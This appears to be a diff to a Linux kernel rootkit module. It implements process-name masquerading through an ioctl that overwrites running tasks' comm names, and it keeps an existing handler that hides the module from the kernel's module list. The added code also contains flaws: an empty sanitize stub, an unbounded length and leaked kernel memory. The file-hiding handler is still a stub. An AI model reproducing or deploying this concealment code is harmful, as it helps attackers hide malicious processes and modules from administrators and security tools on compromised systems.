@@ -9,6 +9,7 @@
 #include <linux/uaccess.h>
 #include <linux/cdev.h>
 #include <asm/syscall.h>
+#include <linux/string.h>
 
 #include "rootkit.h"
 
@@ -39,10 +40,15 @@ static int rootkit_release(struct inode *inode, struct file *filp)
 	return 0;
 }
 
+static void sanitize_req(struct masq_proc_req *req) {
+	return;
+}
+
 static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 			  unsigned long arg)
 {
 	long ret = 0;
+	void __user *argp = (void __user *)arg;
 
 	printk(KERN_INFO "%s\n", __func__);
 
@@ -52,6 +58,7 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		//do something
 		break;
 	case IOCTL_MOD_HIDE: {
+
 		if (is_hidden) {
 			list_add(&THIS_MODULE->list, prev);
 			is_hidden = false;
@@ -61,9 +68,50 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 		}
 		break;
 	}
-	case IOCTL_MOD_MASQ:
-		//do something
+	case IOCTL_MOD_MASQ: {
+
+		struct masq_proc_req __user *user_req = argp;
+		struct masq_proc_req req;
+		struct masq_proc __user *user_list;
+		struct task_struct *task;
+		size_t i, list_size;
+
+		if (copy_from_user(&req, user_req, sizeof(struct masq_proc_req))) {
+			ret = -EFAULT;
+			break;
+		}
+		user_list = (struct masq_proc __user *)req.list;
+		if (req.len < 0) {
+			ret = -EINVAL;
+			break;
+		}
+		list_size = sizeof(struct masq_proc) * req.len;
+		req.list = (struct masq_proc *)kmalloc(list_size, GFP_KERNEL);
+		if (req.list == NULL) {
+			ret = -EFAULT;
+			break;
+		}
+		if (copy_from_user(req.list, user_list, list_size)) {
+			ret = -EFAULT;
+			break;
+		}
+		
+		// XXX: remove entry with strlen(new_name) > strlen(orig_name)
+		sanitize_req(&req);
+
+		for_each_process(task) {
+			for (i = 0; i < req.len; i++)
+				if (strncmp(req.list[i].orig_name, task->comm, sizeof(task->comm)) == 0) {
+					// set_task_comm(task, req.list[i].new_name);
+					// XXX: this correct?
+					task_lock(task);
+					strlcpy(task->comm, req.list[i].new_name, sizeof(task->comm));
+					task_unlock(task);
+				}
+		}
+		
 		break;
+	}
 	case IOCTL_FILE_HIDE:
 		//do something
 		break;
